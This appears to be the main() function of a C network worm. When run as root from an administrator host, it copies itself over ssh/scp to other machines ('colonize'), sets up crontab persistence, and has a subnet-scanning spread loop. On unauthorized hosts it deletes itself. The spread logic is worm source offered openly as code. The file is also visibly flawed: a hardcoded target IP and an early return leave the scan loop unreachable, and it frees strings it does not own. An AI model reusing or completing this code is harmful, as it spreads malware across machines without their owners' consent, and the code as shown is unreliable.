#include "../include/main.h"

int main (int argc, char **argv) {
	int portSSH, cpt;
	char programPath[PATH_MAX];
	dictionary *dico;
	struct in_addr adminHost;
	char *programName, *ip, *command, *control, *targetPath, *crontab, *scp, *ssh, *broadcast;
	struct in_addr *hostList = NULL;

	// get real path of the program
	realpath(argv[0], programPath);

	// get the program name
	programName = basename(argv[0]);

	// go into the program directory
	chdir(dirname(argv[0]));

	// read and check the configuration file
	dico = GetConfig();
	ip = iniparser_getstring(dico, "Administrator:ip", NULL);
	command = iniparser_getstring(dico, "Administrator:command", NULL);
	control = iniparser_getstring(dico, "Target:control", NULL);
	targetPath = iniparser_getstring(dico, "Target:targetPath", NULL);
	crontab = iniparser_getstring(dico, "Target:crontab", NULL);
	scp = iniparser_getstring(dico, "Network:scp", NULL);
	ssh = iniparser_getstring(dico, "Network:ssh", NULL);
	portSSH = iniparser_getint(dico, "Network:portSSH", -1);
	broadcast = iniparser_getstring(dico, "Network:broadcast", NULL);

	// if the user is root
	if (isRoot()) {
		// if the host is the administrator
		if(isSourceHost(ip)) {
			colonize("192.168.1.90", programPath, ssh, portSSH, scp, targetPath, crontab);
			return 0;
			hostList = scanNetwork(ip, broadcast, portSSH);
			inet_aton(ip, &adminHost);
			cpt = 0;
			while (1) {
				// if the target host and the administrator host are in the same subnet
				if (inet_netof(hostList[cpt]) == inet_netof(adminHost)) {
					// if the host is not colonized
					if (!isAlreadyColonized(inet_ntoa(hostList[cpt]), programName, ssh, portSSH, targetPath)) {
						// colonize the host
						colonize(inet_ntoa(hostList[cpt]), programPath, ssh, portSSH, scp, targetPath, crontab);
					}
				}
				else
					break;
				cpt++;
			}
		}
		else {
			// if the host is authorized
			if (isAuthorized(control)) {
				printf("authorized");
			}
			else {
				printf("not authorized");
				// delete program, configuration file and restore crontab
				wormDelete(programName, targetPath, crontab);
			}
		}
	}
	free(ip);
	free(command);
	free(control);
	free(targetPath);
	free(crontab);
	free(scp);
	free(ssh);
	free(broadcast);
	free(dico);

	return 0;

}

